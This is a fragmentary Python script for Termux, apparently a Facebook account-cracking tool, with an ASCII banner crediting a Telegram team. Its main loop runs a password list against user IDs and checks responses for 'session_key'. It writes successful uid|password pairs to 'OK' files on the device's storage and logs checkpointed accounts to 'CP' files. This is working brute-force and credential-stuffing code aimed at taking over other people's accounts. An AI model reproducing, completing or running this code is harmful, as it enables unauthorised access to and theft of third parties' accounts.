...
logo = f"""
       {xd} {G}<\\> FUCKED BY - https://t.me/KGF_TERMUX_TEAM <\\>
       {W} _______ _  _  _ _______  ______
       {W} |______ |  |  | |_____| |  ____
       {W} ______| |__|__| |     | |_____| {G}2.0
{W}──────────────────────────────────────────────────
       {xd} DEVELOPER {xdxx} SW{G}A{W}G-XD [BOKA-XODA]
...
def ___filex___():
    clear()
    print(f'''{xd} EXAMPLE {xdxx} /sdcard/Fuck_SWAG.txt''')
    linex()
    ...
    try:
        for pas in passlist:
            ...
            if 'session_key' in po:
                ...
                if 'LIVE' in response:
                    print(f'''\r{G}➤{W}➤{G} Fuck_SWAG-OK  {str(uid)} | {pas} ''')
                    with open('/sdcard/Fuck_SWAG-S1-RNDM-OK.txt', 'a') as f:
                        f.write(str(uid) + '|' + pas + '\n')
                    oks.append(str(uid))
                    break
                ...
                uid = po['error']['error_data']['uid']
                print(f'''\r{G}➤{W}➤{Y} Fuck_SWAG-CP ''' + uid + ' | ' + pas + '\x1b[1;97m')
                with open('/sdcard/Fuck_SWAG-S1-RNDM-CP.txt', 'a') as f:
                    f.write(str(uid) + '|' + pas + '\n')
                cps.append(str(uid))
                break
            else:
